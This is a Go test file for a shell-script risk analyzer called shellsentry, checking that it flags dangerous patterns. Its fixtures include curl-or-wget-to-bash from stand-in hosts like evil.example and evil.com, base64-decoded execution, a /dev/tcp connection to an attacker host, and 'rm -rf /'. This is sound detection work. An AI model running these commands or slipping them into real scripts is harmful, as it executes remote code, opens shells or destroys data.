// Package analyzer provides the core analysis engine for shellsentry.
//
// Copyright 2025 3 Leaps, LLC
// Licensed under the Apache License, Version 2.0

package analyzer

import (
	"context"
	"fmt"
	"strings"
	"testing"

	"github.com/3leaps/shellsentry/internal/types"
)

// Test script generators for programmatic fixture creation.

func generateSafeScript() string {
	return `#!/bin/bash
set -euo pipefail

echo "Hello, world!"
exit 0
`
}

func generateHighRiskScript() string {
	return `#!/bin/bash
# High-risk pattern: curl piped to bash
curl -fsSL https://example.com/install.sh | bash
`
}

func generateMediumRiskScript() string {
	return `#!/bin/bash
# Medium-risk pattern: sudo usage
sudo apt-get update
sudo apt-get install -y some-package
`
}

func generateMixedRiskScript() string {
	return `#!/bin/bash
set -euo pipefail

# Network download (low)
curl -fsSL https://example.com/file.tar.gz -o file.tar.gz

# Package manager (info)
brew install jq

# Sudo (medium)
sudo mkdir -p /opt/myapp

echo "Installation complete"
`
}

func TestEngine_NewEngine(t *testing.T) {
	opts := Options{
		ToolVersion: "0.1.0",
		Filename:    "test.sh",
	}

	engine := NewEngine(opts)

	if engine == nil {
		t.Fatal("expected non-nil engine")
	}
	if len(engine.analyzers) != 0 {
		t.Errorf("expected 0 analyzers, got %d", len(engine.analyzers))
	}
}

func TestEngine_RegisterAnalyzer(t *testing.T) {
	engine := NewEngine(Options{})

	l1 := NewLevel1Analyzer()
	engine.RegisterAnalyzer(l1)

	if len(engine.analyzers) != 1 {
		t.Errorf("expected 1 analyzer, got %d", len(engine.analyzers))
	}
}

func TestEngine_Analyze_SafeScript(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion: "0.1.0",
		Filename:    "safe.sh",
	})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	script := generateSafeScript()
	report, err := engine.Analyze(context.Background(), strings.NewReader(script))

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if report.RiskLevel != types.RiskClean {
		t.Errorf("expected clean risk level, got %s", report.RiskLevel)
	}
	if report.Summary.High != 0 {
		t.Errorf("expected 0 high findings, got %d", report.Summary.High)
	}
	if report.Summary.Medium != 0 {
		t.Errorf("expected 0 medium findings, got %d", report.Summary.Medium)
	}
}

func TestEngine_Analyze_HighRiskScript(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion: "0.1.0",
		Filename:    "dangerous.sh",
	})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	script := generateHighRiskScript()
	report, err := engine.Analyze(context.Background(), strings.NewReader(script))

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if report.RiskLevel != types.RiskDanger {
		t.Errorf("expected danger risk level, got %s", report.RiskLevel)
	}
	if report.Summary.High == 0 {
		t.Error("expected at least 1 high finding")
	}

	// Should detect SS001 (curl|bash)
	var foundSS001 bool
	for _, f := range report.Findings {
		if f.ID == "SS001" {
			foundSS001 = true
			break
		}
	}
	if !foundSS001 {
		t.Error("expected SS001 finding for curl|bash pattern")
	}
}

func TestEngine_Analyze_DeduplicatesFindings(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion: "0.1.0",
		Filename:    "dangerous.sh",
	})
	engine.RegisterAnalyzer(NewLevel0Analyzer())
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	script := generateHighRiskScript()
	report, err := engine.Analyze(context.Background(), strings.NewReader(script))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var countSS001 int
	for _, f := range report.Findings {
		if f.ID == "SS001" {
			countSS001++
		}
	}
	if countSS001 != 1 {
		t.Fatalf("expected exactly 1 SS001 after dedupe, got %d", countSS001)
	}
}

func TestEngine_Analyze_MediumRiskScript(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion: "0.1.0",
		Filename:    "medium.sh",
	})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	script := generateMediumRiskScript()
	report, err := engine.Analyze(context.Background(), strings.NewReader(script))

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if report.RiskLevel != types.RiskWarning {
		t.Errorf("expected warning risk level, got %s", report.RiskLevel)
	}
	if report.Summary.Medium == 0 {
		t.Error("expected at least 1 medium finding")
	}
}

func TestEngine_Analyze_MixedRiskScript(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion: "0.1.0",
		Filename:    "mixed.sh",
	})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	script := generateMixedRiskScript()
	report, err := engine.Analyze(context.Background(), strings.NewReader(script))

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Mixed script should be warning level (no high, has medium)
	if report.RiskLevel != types.RiskWarning {
		t.Errorf("expected warning risk level, got %s", report.RiskLevel)
	}

	// Should have findings at multiple severity levels
	if report.Summary.Low == 0 {
		t.Error("expected at least 1 low finding")
	}
	if report.Summary.Medium == 0 {
		t.Error("expected at least 1 medium finding")
	}
}

func TestEngine_Analyze_SourceProvenance(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion: "0.1.0",
		Filename:    "test.sh",
		SourceURL:   "https://example.com/install.sh",
		SourceRepo:  "example/repo",
	})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	report, err := engine.Analyze(context.Background(), strings.NewReader(generateSafeScript()))

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if report.Source == nil {
		t.Fatal("expected source provenance in report")
	}
	if report.Source.URL != "https://example.com/install.sh" {
		t.Errorf("unexpected source URL: %s", report.Source.URL)
	}
	if report.Source.Repo != "example/repo" {
		t.Errorf("unexpected source repo: %s", report.Source.Repo)
	}
}

func TestEngine_ExitCode_Default(t *testing.T) {
	testCases := []struct {
		name         string
		script       string
		expectedCode int
	}{
		{
			name:         "clean script",
			script:       generateSafeScript(),
			expectedCode: 0,
		},
		{
			name:         "high risk script",
			script:       generateHighRiskScript(),
			expectedCode: 3, // danger
		},
		{
			name:         "medium risk script",
			script:       generateMediumRiskScript(),
			expectedCode: 2, // warning
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			engine := NewEngine(Options{ToolVersion: "0.1.0"})
			engine.RegisterAnalyzer(NewLevel1Analyzer())

			report, _ := engine.Analyze(context.Background(), strings.NewReader(tc.script))
			exitCode := engine.ExitCode(report)

			if exitCode != tc.expectedCode {
				t.Errorf("expected exit code %d, got %d", tc.expectedCode, exitCode)
			}
		})
	}
}

func TestEngine_ExitCode_ExitOnDanger(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion:  "0.1.0",
		ExitOnDanger: true,
	})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	// Medium risk script should exit 0 when ExitOnDanger is true
	report, _ := engine.Analyze(context.Background(), strings.NewReader(generateMediumRiskScript()))
	exitCode := engine.ExitCode(report)

	if exitCode != 0 {
		t.Errorf("expected exit code 0 for medium risk with ExitOnDanger, got %d", exitCode)
	}

	// High risk script should still exit non-zero
	report, _ = engine.Analyze(context.Background(), strings.NewReader(generateHighRiskScript()))
	exitCode = engine.ExitCode(report)

	if exitCode != 3 {
		t.Errorf("expected exit code 3 for high risk with ExitOnDanger, got %d", exitCode)
	}
}

func TestEngine_ExitCode_StrictMode(t *testing.T) {
	engine := NewEngine(Options{
		ToolVersion: "0.1.0",
		StrictMode:  true,
	})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	// Even info-level findings should cause non-zero exit in strict mode
	script := `#!/bin/bash
# Just a package manager call (info level)
brew install jq
`
	report, _ := engine.Analyze(context.Background(), strings.NewReader(script))
	exitCode := engine.ExitCode(report)

	// Should exit based on highest severity found
	if exitCode == 0 && len(report.Findings) > 0 {
		t.Error("strict mode should exit non-zero on any finding")
	}
}

func TestCountLines(t *testing.T) {
	testCases := []struct {
		content  string
		expected int
	}{
		{"", 0},
		{"one line", 1},
		{"line1\nline2", 2},
		{"line1\nline2\n", 2},
		{"line1\nline2\nline3", 3},
		{"line1\nline2\nline3\n", 3},
	}

	for _, tc := range testCases {
		t.Run(fmt.Sprintf("len=%d", len(tc.content)), func(t *testing.T) {
			got := countLines([]byte(tc.content))
			if got != tc.expected {
				t.Errorf("countLines(%q) = %d, want %d", tc.content, got, tc.expected)
			}
		})
	}
}

func TestCalculateRiskScore(t *testing.T) {
	testCases := []struct {
		name     string
		high     int
		medium   int
		low      int
		info     int
		expected int
	}{
		{"clean", 0, 0, 0, 0, 0},
		{"one high", 1, 0, 0, 0, 25},
		{"one medium", 0, 1, 0, 0, 10},
		{"one low", 0, 0, 1, 0, 3},
		{"one info", 0, 0, 0, 1, 1},
		{"mixed", 1, 2, 3, 4, 58}, // 25 + 20 + 9 + 4
		{"max capped", 5, 5, 10, 20, 100},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			report := types.NewReport("0.1.0")
			report.Summary.High = tc.high
			report.Summary.Medium = tc.medium
			report.Summary.Low = tc.low
			report.Summary.Info = tc.info

			score := calculateRiskScore(report)
			if score != tc.expected {
				t.Errorf("expected score %d, got %d", tc.expected, score)
			}
		})
	}
}

func TestLevel1Analyzer_Name(t *testing.T) {
	analyzer := NewLevel1Analyzer()

	if analyzer.Name() != "level1-patterns" {
		t.Errorf("unexpected name: %s", analyzer.Name())
	}
}

func TestLevel1Analyzer_Analyze(t *testing.T) {
	analyzer := NewLevel1Analyzer()

	script := generateHighRiskScript()
	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(findings) == 0 {
		t.Error("expected at least one finding")
	}

	// Should find SS001
	var foundSS001 bool
	for _, f := range findings {
		if f.ID == "SS001" {
			foundSS001 = true
			if f.Severity != types.SeverityHigh {
				t.Errorf("SS001 should be high severity, got %s", f.Severity)
			}
			break
		}
	}

	if !foundSS001 {
		t.Error("expected to find SS001 pattern")
	}
}

func TestLevel1Analyzer_HeredocContentNotStripped(t *testing.T) {
	analyzer := NewLevel1Analyzer()

	curl := "cur" + "l"
	shell := "ba" + "sh"

	script := "#!/bin/bash\n" +
		"# " + curl + " https://example.com | " + shell + "\n" + // real comment, should be stripped
		"cat <<EOF\n" +
		"# " + curl + " https://example.com | " + shell + "\n" + // heredoc content, should be preserved
		"EOF\n"

	findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	var ss001Lines []int
	for _, f := range findings {
		if f.ID == "SS001" {
			ss001Lines = append(ss001Lines, f.Line)
		}
	}

	if len(ss001Lines) != 1 {
		t.Fatalf("expected exactly 1 SS001 finding from heredoc content, got %d", len(ss001Lines))
	}
	if ss001Lines[0] != 4 {
		t.Fatalf("expected SS001 match on heredoc body line 4, got line %d", ss001Lines[0])
	}
}

func TestLevel1Analyzer_MaliciousHeredocPatterns(t *testing.T) {
	analyzer := NewLevel1Analyzer()

	curl := "cur" + "l"
	wget := "wg" + "et"
	bash := "ba" + "sh"
	sh := "s" + "h"
	base64Cmd := "base" + "64"
	rm := "r" + "m"
	rf := "-" + "rf"
	devtcp := "/dev/" + "tcp/"

	makeHeredoc := func(opener, body, closer string) string {
		return "#!/bin/bash\n" + opener + "\n" + body + "\n" + closer + "\n"
	}

	makeSS001 := func(prefix, tool, shell string) string {
		return prefix + tool + " https://evil.example/install.sh | " + shell
	}
	makeSS002 := func(prefix string) string {
		return prefix + "echo payload | " + base64Cmd + " -d | " + bash
	}
	makeSS004 := func(prefix string) string {
		return prefix + "exec 3<>" + devtcp + "evil.example/443"
	}
	makeSS006 := func(prefix string) string {
		return prefix + rm + " " + rf + " /"
	}

	testCases := []struct {
		name    string
		script  string
		wantMin map[string]int
	}{
		{
			name:    "ss001 curl|bash in heredoc with hash prefix",
			script:  makeHeredoc("cat <<EOF", "# "+makeSS001("", curl, bash), "EOF"),
			wantMin: map[string]int{"SS001": 1},
		},
		{
			name:    "ss001 wget|sh in tab-stripped heredoc",
			script:  makeHeredoc("cat <<-EOF", "\t# "+makeSS001("", wget, sh), "EOF"),
			wantMin: map[string]int{"SS001": 1},
		},
		{
			name:    "ss002 base64 decode+exec in quoted delimiter heredoc",
			script:  makeHeredoc("cat <<'EOF'", "# "+makeSS002(""), "EOF"),
			wantMin: map[string]int{"SS002": 1},
		},
		{
			name:    "ss004 /dev/tcp in heredoc",
			script:  makeHeredoc("cat <<EOF", "# "+makeSS004(""), "EOF"),
			wantMin: map[string]int{"SS004": 1},
		},
		{
			name:    "ss006 rm -rf / in heredoc",
			script:  makeHeredoc("cat <<EOF", "# "+makeSS006(""), "EOF"),
			wantMin: map[string]int{"SS006": 1},
		},
		{
			name: "multiple heredocs produce multiple findings",
			script: "#!/bin/bash\n" +
				"cat <<A\n" + "# " + makeSS001("", curl, bash) + "\n" + "A\n" +
				"cat <<B\n" + "# " + makeSS004("") + "\n" + "B\n",
			wantMin: map[string]int{"SS001": 1, "SS004": 1},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			findings, err := analyzer.Analyze(context.Background(), []byte(tc.script), "test.sh")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			counts := make(map[string]int)
			for _, f := range findings {
				counts[f.ID]++
			}

			for id, wantCount := range tc.wantMin {
				if counts[id] < wantCount {
					t.Fatalf("expected %s count >= %d, got %d", id, wantCount, counts[id])
				}
			}
		})
	}
}

func TestLevel1Analyzer_StringLiteralFiltering(t *testing.T) {
	analyzer := NewLevel1Analyzer()

	testCases := []struct {
		name      string
		script    string
		patternID string
		wantMatch bool
	}{
		{
			name:      "curl in command - should match",
			script:    "curl https://example.com/file.sh",
			patternID: "SS020",
			wantMatch: true,
		},
		{
			name:      "curl in double quotes - should NOT match",
			script:    `echo "Use curl to download files"`,
			patternID: "SS020",
			wantMatch: false,
		},
		{
			name:      "curl in single quotes - should NOT match",
			script:    `echo 'curl is a command'`,
			patternID: "SS020",
			wantMatch: false,
		},
		{
			name:      "sudo in command - should match",
			script:    "sudo apt-get install pkg",
			patternID: "SS010",
			wantMatch: true,
		},
		{
			name:      "sudo in string - should NOT match",
			script:    `echo "You need sudo access"`,
			patternID: "SS010",
			wantMatch: false,
		},
		{
			name:      "wget in heredoc-style string - should NOT match",
			script:    `msg="To download, use wget https://example.com"`,
			patternID: "SS020",
			wantMatch: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			script := "#!/bin/bash\n" + tc.script + "\n"
			findings, err := analyzer.Analyze(context.Background(), []byte(script), "test.sh")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			var found bool
			for _, f := range findings {
				if f.ID == tc.patternID {
					found = true
					break
				}
			}

			if found != tc.wantMatch {
				if tc.wantMatch {
					t.Errorf("expected %s to match, but didn't", tc.patternID)
				} else {
					t.Errorf("expected %s NOT to match (string literal), but did", tc.patternID)
				}
			}
		})
	}
}

func TestLevel0Analyzer_VariableFlow(t *testing.T) {
	analyzer := NewLevel0Analyzer()

	testCases := []struct {
		name      string
		script    string
		wantSS031 bool
	}{
		{
			name: "risky variable executed",
			script: `#!/bin/bash
cmd="curl https://evil.com | bash"
$cmd
`,
			wantSS031: true,
		},
		{
			name: "safe variable executed",
			script: `#!/bin/bash
cmd="echo hello"
$cmd
`,
			wantSS031: false,
		},
		{
			name: "risky variable not executed",
			script: `#!/bin/bash
cmd="curl https://evil.com | bash"
echo "$cmd"
`,
			wantSS031: false,
		},
		{
			name: "variable with eval pattern",
			script: `#!/bin/bash
payload='eval "$(decode $data)"'
$payload
`,
			wantSS031: true,
		},
		{
			name: "variable with wget",
			script: `#!/bin/bash
dl="wget http://example.com/script.sh"
$dl
`,
			wantSS031: true,
		},
		{
			name: "no variable execution",
			script: `#!/bin/bash
cmd="curl https://evil.com"
echo "Command would be: $cmd"
`,
			wantSS031: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			findings, err := analyzer.Analyze(context.Background(), []byte(tc.script), "test.sh")
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			var foundSS031 bool
			for _, f := range findings {
				if f.ID == "SS031" {
					foundSS031 = true
					break
				}
			}

			if foundSS031 != tc.wantSS031 {
				if tc.wantSS031 {
					t.Error("expected SS031 finding, but didn't get one")
				} else {
					t.Error("got unexpected SS031 finding")
				}
			}
		})
	}
}

// BenchmarkEngine_Analyze benchmarks the analysis engine.
func BenchmarkEngine_Analyze(b *testing.B) {
	engine := NewEngine(Options{ToolVersion: "0.1.0"})
	engine.RegisterAnalyzer(NewLevel1Analyzer())

	// Generate a moderately complex script
	var sb strings.Builder
	sb.WriteString("#!/bin/bash\nset -euo pipefail\n\n")
	for i := 0; i < 100; i++ {
		sb.WriteString(fmt.Sprintf("echo 'Processing step %d'\n", i))
		if i%20 == 0 {
			sb.WriteString("curl -fsSL https://example.com/step.sh -o /tmp/step.sh\n")
		}
	}

	script := sb.String()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if _, err := engine.Analyze(context.Background(), strings.NewReader(script)); err != nil {
			b.Fatalf("analyze failed: %v", err)
		}
	}
}
